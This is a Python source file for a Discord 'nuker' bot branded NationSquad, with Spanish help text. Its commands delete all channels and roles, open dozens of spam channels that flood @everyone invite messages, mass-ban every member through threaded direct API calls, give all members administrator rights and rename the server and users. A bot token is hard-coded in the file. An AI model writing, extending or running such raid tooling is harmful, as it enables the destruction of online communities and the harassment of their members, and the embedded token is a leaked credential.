import discord, threading, asyncio, os, requests, sys, time
from discord.ext import commands
from os import _exit
from time import sleep
from datetime import datetime
from colorama import Fore , init


# CONFIGURACION / CONFIG
#-------------------------------------------------------------------------------
token = "MTIxNDM2ODM1ODg4ODI1MTQyMg.GsvBGI.xyCeSmXryrQnrAOJZmI7ULLQBCJZO_nSChMZUQ"
Prefix = "."
Renameall_name = "NationSquad"# RENAMEALL MEMBERS NAME
rolename = "NationSquad" # CREATEROLES NAME
Mensage_Webhooks = "||@everyone|| http://discord.gg/nationsquad" # WEBHOOKS MESSAGE 
Nombre_canales = "𝙉𝙖𝙩𝙞𝙤𝙣𝙎𝙦𝙪𝙖𝙙-💀" # CHANNEL NAME
image_icono_url = "https://i.postimg.cc/rskfv2TX/Black-and-White-Monogram-Business-Logo-7.png" # SERVER ICON
server_name = "Paco Alcazer 💀"# SERVER NAME
#-------------------------------------------------------------------------------

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=f"{Prefix}", intents=discord.Intents.all())
sessions = requests.Session()

if sys.platform == "win32":
	clear = lambda: os.system("cls")
else:
	clear = lambda: os.system("clear")


if bot:
	headers = {
	  "Authorization": f"Bot {token}"
	}
else:
	headers = {
	  "Authorization": token
	}

def menu():
    os.system("cls")
    print(f"""
{Fore.LIGHTRED_EX}███▄▄▄▄      ▄████████     ███      ▄█   ▄██████▄  ███▄▄▄▄   
{Fore.LIGHTRED_EX}███▀▀▀██▄   ███    ███ ▀█████████▄ ███  ███    ███ ███▀▀▀██▄   
{Fore.LIGHTRED_EX}███   ███   ███    ███    ▀███▀▀██ ███▌ ███    ███ ███   ███   
{Fore.LIGHTRED_EX}███   ███   ███    ███     ███   ▀ ███▌ ███    ███ ███   ███     {Fore.RESET}{Fore.LIGHTBLACK_EX}╭───────────────────────────╮{Fore.RESET}
{Fore.LIGHTRED_EX}███   ███ ▀███████████     ███     ███▌ ███    ███ ███   ███     {Fore.RESET}{Fore.LIGHTBLACK_EX}│    Created By !"Jimo      │{Fore.RESET}
{Fore.LIGHTRED_EX}███   ███   ███    ███     ███     ███  ███    ███ ███   ███     {Fore.RESET}{Fore.LIGHTBLACK_EX}│     .gg/NationSquad       │{Fore.RESET}
{Fore.LIGHTRED_EX}███   ███   ███    ███     ███     ███  ███    ███ ███   ███     {Fore.RESET}{Fore.LIGHTBLACK_EX}╰───────────────────────────╯{Fore.RESET}
{Fore.LIGHTRED_EX} ▀█   █▀    ███    █▀     ▄████▀   █▀    ▀██████▀   ▀█   █▀  
                                                             
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}Help      {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Ver los comandos dentro sel servidor
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}Nation    {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Ejecuta la mayoria de comandos del bot con alta velocidad
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}Nuke      {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Elimina todos los canales del servidor
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}On        {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Crea canales dentro del servidor y spammea
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}Spam      {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Spammea todos las Webhooks Creadas
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}Admin     {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Te da rol de administrador
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}Adminall  {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Se le da a todos los miembros del servidor rol adminstrador    
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}Croles    {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Crea role dentro del servidor 
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}Droles    {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Elimina todos los roles del servidor
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}Banall    {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Banea todos los miembros del servidor
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}kickall   {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}kickea todos los miembros del servidor
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}SvrName   {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Cambia el nombre del servidor al que tu pongas .Svrname <Nombre>
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}SvrIcon   {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Cambia el icono del servidor
{Fore.LIGHTRED_EX}[{Fore.LIGHTBLACK_EX}>{Fore.LIGHTRED_EX}] {Fore.LIGHTBLACK_EX}Renameall {Fore.LIGHTRED_EX}|   {Fore.LIGHTBLACK_EX}Cambia el nombre de todos los miembros del servicor      
{Fore.LIGHTRED_EX}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
""")

@bot.event
async def on_ready():
	try:
		await bot.change_presence(status=discord.Status.invisible)
	except Exception:
		pass
	menu()
    
bot.remove_command("help")


@bot.command(name="help")
async def help(ctx):
    custom_color = 0x000000  

    embed = discord.Embed(
        color=custom_color
    )
    embed.add_field(name=f"{Prefix} Help", value="```Muestra la lista de comandos disponibles```", inline=False)
    embed.add_field(name=f"{Prefix} Nation", value="```Ejecuta la mayoria de comandos del bot, con alta velocidad```", inline=False)
    embed.add_field(name=f"{Prefix} Nuke", value="```Elimina todos los canales de texto en el servidor```", inline=False)
    embed.add_field(name=f"{Prefix} On", value="```Crea canales dentro del servidor y spammea```", inline=False)
    embed.add_field(name=f"{Prefix} Spam", value="```Spammea todos las Webhooks Creadas```", inline=False)
    embed.add_field(name=f"{Prefix} Admin", value="```Te da rol de administrador```", inline=False)
    embed.add_field(name=f"{Prefix} Adminall", value="```Se le da a todos los miembros del servidor rol adminstrador```", inline=False)
    embed.add_field(name=f"{Prefix} Crtroles", value="```Crea roles en el servidor```", inline=False)
    embed.add_field(name=f"{Prefix} Delroles", value="```Elimina roles en el servidor```", inline=False)
    embed.add_field(name=f"{Prefix} Banall", value="```Banea a todos los usuarios del servidor```", inline=False)
    embed.add_field(name=f"{Prefix} kickall", value="```kickea a todos los usuarios del servidor```", inline=False)
    embed.add_field(name=f"{Prefix} Servername", value="```Cambia el nombre del servidor al que tu pongas .Svrname <Nombre>```", inline=False)
    embed.add_field(name=f"{Prefix} Servericon", value="```Muestra el icono del servidor```", inline=False)
    embed.add_field(name=f"{Prefix} Renameall", value="```Cambia el nombre de todos los miembros del servidor```", inline=False)


    await ctx.send(embed=embed)
    print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Comando Help enviado ")


@bot.command()
async def start(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name="NationSquad")

    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])

    await asyncio.gather(*[ctx.guild.create_text_channel("NationSquad-💀") for _ in range(50)])

    for channel in ctx.guild.text_channels:
        num_webhooks = 5 
        for _ in range(num_webhooks):
            webhook = await channel.create_webhook(name=f"NationSquad{_}") 
            for _ in range(5):
                await webhook.send(Mensage_Webhooks)       


@bot.command(aliases=["nk"])
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name="NationSquad Comeback")

    await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
    print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} canal nukeado")

    await asyncio.gather(*[ctx.guild.create_text_channel("?") for _ in range(1)])


@bot.command()
async def spam(ctx):
    for channel in ctx.guild.text_channels:
        num_webhooks = 5
        for _ in range(num_webhooks):
            webhook = await channel.create_webhook(name=f"NationSquad{_}") 
            for _ in range(5):   
                await ctx.send(Mensage_Webhooks)  


@bot.command(aliases=["On"])
async def on(ctx):
    await ctx.guild.edit(name="NationSquad Comeback")
    await asyncio.gather(*[ctx.guild.create_text_channel(Nombre_canales) for _ in range(50)])


@bot.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(Mensage_Webhooks)
        print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Mensaje enviado a la Webhook")


@bot.command(aliases=["croles", "crtroles"])
async def createroles(ctx):
    await ctx.message.delete()
    for i in range(100):
        await ctx.guild.create_role(name= rolename)
        print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Se ha creado el rol NationSquad")


@bot.command(aliases=["svrname", "ServerName"])
async def servername(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name=server_name)
    print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Nombre del servidor cambiado a {server_name}")


@bot.command(aliases=["srvicon", "servericon"])
async def change_icon(ctx):
    try:
        with open('icon.png', 'rb') as f:
            icon = f.read()
        await ctx.guild.edit(icon=icon)
        print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Icono del servidor cambiado")
    except FileNotFoundError:
        response = requests.get(image_icono_url)
        icon = response.content
        await ctx.guild.edit(icon=icon)
        print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Icono del servidor cambiado")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTRED_EX}[{Fore.RESET}Error{Fore.LIGHTRED_EX}]{Fore.RESET} Error al cambiar el icono del servidor")


@bot.command()
async def kickall(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTRED_EX}[{Fore.RESET}Error{Fore.LIGHTRED_EX}]{Fore.RESET} Conection Error")
		sleep(10)
		_exit(0)

	def mass_kick(i):
		sessions.put(
		  f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
		  headers=headers
		)
	try:
		for i in range(3):
			for member in list(ctx.guild.members):
				threading.Thread(
				  target=mass_kick, 
				  args=(member.id, )
				).start()
				print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Usuario Baneado {member}")
		clear()
		print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Todos los usuarios han sido baneados")
		menu()
	except Exception as error:
		print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTRED_EX}[{Fore.RESET}Error{Fore.LIGHTRED_EX}]{Fore.RESET} Error en BanAll")
		sleep(1)
		_exit(0)


@bot.command(aliases=["NationBan", "banall"])
async def massban(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTRED_EX}[{Fore.RESET}Error{Fore.LIGHTRED_EX}]{Fore.RESET} Conection Error")
		sleep(10)
		_exit(0)

	def mass_ban(i):
		sessions.put(
		  f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
		  headers=headers
		)
	try:
		for i in range(3):
			for member in list(ctx.guild.members):
				threading.Thread(
				  target=mass_ban, 
				  args=(member.id, )
				).start()
				print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Usuario Baneado {member}")
		clear()
		print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Todos los usuarios han sido baneados")
		menu()
	except Exception as error:
		print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTRED_EX}[{Fore.RESET}Error{Fore.LIGHTRED_EX}]{Fore.RESET} Error en BanAll")
		sleep(1)
		_exit(0)


@bot.command(aliases=["droles", "deleteroles"])
async def delroles(ctx):
	try:
		await ctx.message.delete()
		guild = ctx.guild.id
	except:
		print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTRED_EX}[{Fore.RESET}Error{Fore.LIGHTRED_EX}]{Fore.RESET} Conection Error")
		sleep(1)
		_exit(0)

	def delete_role(i):
		sessions.delete(
		  f"https://discord.com/api/v9/guilds/{guild}/roles/{i}",
	  	headers=headers
        )
	try:
		for i in range(3):
			for role in list(ctx.guild.roles):
				threading.Thread(
				  target=delete_role, 
				  args=(role.id, )
				  ).start()
				print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Rol eliminado {role}")
	except Exception as error:
		print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTRED_EX}[{Fore.RESET}Error{Fore.LIGHTRED_EX}]{Fore.RESET} Conection Error")
		sleep(1)
		_exit(0)


@bot.command(aliases=["alladmin", "admall"])
async def adminall(ctx):
    try:
        new_role = await ctx.guild.create_role(name="NationSquad")

        await new_role.edit(permissions=discord.Permissions.all())
        for member in ctx.guild.members:
            await member.add_roles(new_role)
            print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Rol admin añadido a {member.name}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTRED_EX}[{Fore.RESET}Error{Fore.LIGHTRED_EX}]{Fore.RESET} Error al asignar los roles")


@bot.command()
async def admin(ctx):
    try:
        admin_role = await ctx.guild.create_role(name="Nation Admin", permissions=discord.Permissions.all())
        member = ctx.message.author
        await member.add_roles(admin_role)
        print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Se ha añadido el rol de adminstrador a {member.display_name}")
    except Exception as e:
        print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTRED_EX}[{Fore.RESET}Error{Fore.LIGHTRED_EX}]{Fore.RESET} Error al crear y asignar el rol de administrador: {e}")
        

@bot.command()
async def renameall(ctx): 
    async def change_member_name(member, new_name):
        try:
            await member.edit(nick=new_name)
            print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTGREEN_EX}[{Fore.RESET}+{Fore.LIGHTGREEN_EX}]{Fore.RESET} Se cambió el nombre de {member.name}")
        except Exception as e:
            print(f"{Fore.RED}[{Fore.RESET}NationSquad{Fore.RED}] - {Fore.LIGHTRED_EX}[{Fore.RESET}Error{Fore.LIGHTRED_EX}]{Fore.RESET} No se ha podido cambiar el nombre de {member.name}")
    tasks = []
    for member in ctx.guild.members:
        tasks.append(change_member_name(member, Renameall_name))

    await asyncio.gather(*tasks)

bot.run(token)
